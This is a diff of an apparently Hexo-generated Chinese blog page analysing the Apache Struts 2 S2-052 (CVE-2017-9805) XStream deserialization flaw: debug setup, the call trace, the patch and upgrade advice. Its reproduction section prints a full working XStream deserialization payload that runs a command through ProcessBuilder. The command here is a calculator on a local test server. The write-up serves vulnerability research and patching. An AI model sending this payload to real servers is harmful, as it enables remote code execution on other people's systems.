@@ -248,7 +248,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/07/17/Struts2-052漏洞分析/" itemprop="url">Untitled</a></h1>
+                <a class="post-title-link" href="/2019/07/17/Struts2-052漏洞分析/" itemprop="url">Struts 2 漏洞系列之 S2-052</a></h1>
         
 
         <div class="post-meta">
@@ -260,7 +260,7 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-17T17:27:46+08:00">
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-17T19:53:11+08:00">
                 2019-07-17
               </time>
             
@@ -270,6 +270,28 @@
             
           </span>
 
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/漏洞研究/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞研究</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
           
 
           
@@ -303,61 +325,11 @@
             <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h1><p>2017 年 9 月 5 日，由国外安全研究组织 lgtm.com 的安全研究人员发现的严重漏洞在Apache Struts 2官方发布，漏洞编号为 CVE-2017-9805（S2-052）, 攻击者可以传入精心构造的xml数据，远程命令执行。<br>Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，存在安全隐患，可被远程命令执行。<br>利用条件：使用 REST 插件并在受影响版本范围内。<br>利用方式：攻击者构建恶意数据包远程利用。<br>影响版本：Struts 2.1.2 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12</p>
 <h1 id="调试环境搭建"><a href="#调试环境搭建" class="headerlink" title="调试环境搭建"></a><strong>调试环境搭建</strong></h1><p>1）下载官方源码：<br>git clone <a href="https://github.com/apache/Struts.git" target="_blank" rel="noopener">https://github.com/apache/Struts.git</a><br>2）切换到2.5.12分支：<br>git checkout STRUTS_2_5_12<br>3) 把源码包中src/apps/rest-showcase整个文件夹拷贝出来，新建一个项目<br>4）用IDEA或者eclipse导入该maven项目<br>5) debug模式运行后就可以愉快的调试了<br><img src="https://apt-zhou.github.io/images/2019/07/2B51518F-4BA4-45F0-8DB2-00CA371BD745.png" alt="8da50717f7898bf33eaefe302295f2e5"></p>
 <h1 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a><strong>漏洞原理分析</strong></h1><p>根据官方公告知道该漏洞出现在 XstreamHandler 类，在 struts2-rest-plugin-2.5.12.jar 包内。<br>于是查看该类，该类中有一个toObject方法，其作用就是对xml内容进行反序列化。<br><img src="https://apt-zhou.github.io/images/2019/07/B70890FC-0A25-4BE4-BFFF-3DE6D6EED67A.png" alt="5ead76f4153cb13d1164e9d79057621f"><br>先在此方法内打一个断点，然后构造数据包<br><img src="https://apt-zhou.github.io/images/2019/07/6A81BE3B-4208-40FD-880D-20EBF9B38CC0.png" alt="f4315825608415d2685701d110423738"><br>发送数据包后，会跳到断点处，此时，看到是上层调用栈中是ContentTypeInterceptor调用了该方法<br><img src="https://apt-zhou.github.io/images/2019/07/1395EE58-9C66-415A-98A3-453B28F1A32F.png" alt="72f30224353229ed31925e051e6b8da7"><br>ContentTypeInterceptor类中intercept方法会根据传入的Content-Type的值生成相应的对象，由于我们传入的是application/xml，所以对应生成一个xml的处理对象XStreamHandler。<br>继续f5，看到执行反序列化的函数unmarshal，在这个函数执行时没有进行数据安全检查，导致远程命令执行。<br><img src="https://apt-zhou.github.io/images/2019/07/95FC3645-CA75-4311-97CB-3B33B1386B95.png" alt="227328a30b2e1c73bbdafbf4e1018ac5"><br>接着进入unmarshal函数内，继续往下调试，AbstractReflectionConverter会一步步解析我们提交的xml标签和值，最终调用poc中代码<br><img src="https://apt-zhou.github.io/images/2019/07/5DC74FC4-6116-4255-9294-5B32203720A1.png" alt="e767f1e69d9c34b9f79d2437cec288d6"></p>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a><strong>漏洞复现</strong></h1><p>在页面<a href="http://localhost:8080//struts2-rest-showcase/orders/3/edit中点击Submit，" target="_blank" rel="noopener">http://localhost:8080//struts2-rest-showcase/orders/3/edit中点击Submit，</a><br><img src="https://apt-zhou.github.io/images/2019/07/EA70D07D-5925-4D15-A37A-E2110B39CA59.png" alt="816b09313f7dc90d11af504edb249049"><br>拦截HTTP请求并将请求体改为POC Payload，同时将Content-Type Header改为application/xml。<br>payload为：<br><code>&lt;map&gt; 
-  &lt;entry&gt; 
-    &lt;jdk.nashorn.internal.objects.NativeString&gt; 
-      &lt;flags&gt;0&lt;/flags&gt;  
-      &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt; 
-        &lt;dataHandler&gt; 
-          &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt; 
-            &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt; 
-              &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt; 
-                &lt;initialized&gt;false&lt;/initialized&gt;  
-                &lt;opmode&gt;0&lt;/opmode&gt;  
-                &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; 
-                  &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; 
-                    &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;  
-                    &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt; 
-                      &lt;command&gt; 
-                        &lt;string&gt;/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/string&gt; 
-                      &lt;/command&gt;  
-                      &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt; 
-                    &lt;/next&gt; 
-                  &lt;/iter&gt;  
-                  &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt; 
-                    &lt;method&gt; 
-                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;  
-                      &lt;name&gt;start&lt;/name&gt;  
-                      &lt;parameter-types/&gt; 
-                    &lt;/method&gt;  
-                    &lt;name&gt;foo&lt;/name&gt; 
-                  &lt;/filter&gt;  
-                  &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt; 
-                &lt;/serviceIterator&gt;  
-                &lt;lock/&gt; 
-              &lt;/cipher&gt;  
-              &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;  
-              &lt;ibuffer/&gt;  
-              &lt;done&gt;false&lt;/done&gt;  
-              &lt;ostart&gt;0&lt;/ostart&gt;  
-              &lt;ofinish&gt;0&lt;/ofinish&gt;  
-              &lt;closed&gt;false&lt;/closed&gt; 
-            &lt;/is&gt;  
-            &lt;consumed&gt;false&lt;/consumed&gt; 
-          &lt;/dataSource&gt;  
-          &lt;transferFlavors/&gt; 
-        &lt;/dataHandler&gt;  
-        &lt;dataLen&gt;0&lt;/dataLen&gt; 
-      &lt;/value&gt; 
-    &lt;/jdk.nashorn.internal.objects.NativeString&gt;  
-    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt; 
-  &lt;/entry&gt;  
-  &lt;entry&gt; 
-    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;  
-    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt; 
-  &lt;/entry&gt; 
-&lt;/map&gt;</code><br>发送请求后，弹出计算器<br><img src="https://apt-zhou.github.io/images/2019/07/0E9DCB89-68EE-4A06-A636-33163FFC67BF.png" alt="3810b8ae21a2fafa7e2e1944d8a046ef"></p>
-<h1 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a><strong>补丁</strong></h1><p>官方补丁，官方的修复方案中, 主要就是将 xml 中的数据白名单化，把 Collection 和 Map，一些基础类，时间类放在白名单中，这样就能阻止 XStream 反序列化的过程中带入一些有害类<img src="evernotecid://34243D5A-0080-4E5B-82D3-EF8A5533BD45/appyinxiangcom/23351960/ENNote/p35?hash=416a87182134cfa3f029ac2fe3e64a60" alt="416a87182134cfa3f029ac2fe3e64a60.png"></p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a><strong>漏洞复现</strong></h1><p>在页面<a href="http://localhost:8080//struts2-rest-showcase/orders/3/edit中点击Submit，" target="_blank" rel="noopener">http://localhost:8080//struts2-rest-showcase/orders/3/edit中点击Submit，</a><br><img src="https://apt-zhou.github.io/images/2019/07/EA70D07D-5925-4D15-A37A-E2110B39CA59.png" alt="816b09313f7dc90d11af504edb249049"><br>拦截HTTP请求并将请求体改为POC Payload，同时将Content-Type Header改为application/xml。<br>payload为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;map&gt; </span><br><span class="line">  &lt;entry&gt; </span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt; </span><br><span class="line">      &lt;flags&gt;0&lt;/flags&gt;  </span><br><span class="line">      &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt; </span><br><span class="line">        &lt;dataHandler&gt; </span><br><span class="line">          &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt; </span><br><span class="line">            &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt; </span><br><span class="line">              &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt; </span><br><span class="line">                &lt;initialized&gt;false&lt;/initialized&gt;  </span><br><span class="line">                &lt;opmode&gt;0&lt;/opmode&gt;  </span><br><span class="line">                &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; </span><br><span class="line">                  &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; </span><br><span class="line">                    &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;  </span><br><span class="line">                    &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt; </span><br><span class="line">                      &lt;command&gt; </span><br><span class="line">                        &lt;string&gt;/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/string&gt; </span><br><span class="line">                      &lt;/command&gt;  </span><br><span class="line">                      &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt; </span><br><span class="line">                    &lt;/next&gt; </span><br><span class="line">                  &lt;/iter&gt;  </span><br><span class="line">                  &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt; </span><br><span class="line">                    &lt;method&gt; </span><br><span class="line">                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;  </span><br><span class="line">                      &lt;name&gt;start&lt;/name&gt;  </span><br><span class="line">                      &lt;parameter-types/&gt; </span><br><span class="line">                    &lt;/method&gt;  </span><br><span class="line">                    &lt;name&gt;foo&lt;/name&gt; </span><br><span class="line">                  &lt;/filter&gt;  </span><br><span class="line">                  &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt; </span><br><span class="line">                &lt;/serviceIterator&gt;  </span><br><span class="line">                &lt;lock/&gt; </span><br><span class="line">              &lt;/cipher&gt;  </span><br><span class="line">              &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;  </span><br><span class="line">              &lt;ibuffer/&gt;  </span><br><span class="line">              &lt;done&gt;false&lt;/done&gt;  </span><br><span class="line">              &lt;ostart&gt;0&lt;/ostart&gt;  </span><br><span class="line">              &lt;ofinish&gt;0&lt;/ofinish&gt;  </span><br><span class="line">              &lt;closed&gt;false&lt;/closed&gt; </span><br><span class="line">            &lt;/is&gt;  </span><br><span class="line">            &lt;consumed&gt;false&lt;/consumed&gt; </span><br><span class="line">          &lt;/dataSource&gt;  </span><br><span class="line">          &lt;transferFlavors/&gt; </span><br><span class="line">        &lt;/dataHandler&gt;  </span><br><span class="line">        &lt;dataLen&gt;0&lt;/dataLen&gt; </span><br><span class="line">      &lt;/value&gt; </span><br><span class="line">    &lt;/jdk.nashorn.internal.objects.NativeString&gt;  </span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt; </span><br><span class="line">  &lt;/entry&gt;  </span><br><span class="line">  &lt;entry&gt; </span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;  </span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt; </span><br><span class="line">  &lt;/entry&gt; </span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure>
+
+<p>发送请求后，弹出计算器<br><img src="https://apt-zhou.github.io/images/2019/07/0E9DCB89-68EE-4A06-A636-33163FFC67BF.png" alt="3810b8ae21a2fafa7e2e1944d8a046ef"></p>
+<h1 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a><strong>补丁</strong></h1><p>官方补丁，官方的修复方案中, 主要就是将 xml 中的数据白名单化，把 Collection 和 Map，一些基础类，时间类放在白名单中，这样就能阻止 XStream 反序列化的过程中带入一些有害类<img src="https://apt-zhou.github.io/images/2019/07/C585B43E-FEE5-426A-B64C-7540C2F38D53.png" alt="416a87182134cfa3f029ac2fe3e64a60.png"></p>
 <h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a><strong>修复建议</strong></h1><p>Version 2.3.0 to 2.3.33升级到Struts 2.3.34版本<br>Version 2.5.0 to 2.5.12升级到Struts 2.5.13版本</p>
 <h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a><strong>参考</strong></h4><p><a href="https://cwiki.apache.org/confluence/display/WW/S2-052" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-052</a></p>
 
@@ -448,7 +420,25 @@
             
 
             
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">categories</span>
+                
+              </div>
+            
 
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
             
 
           </nav>
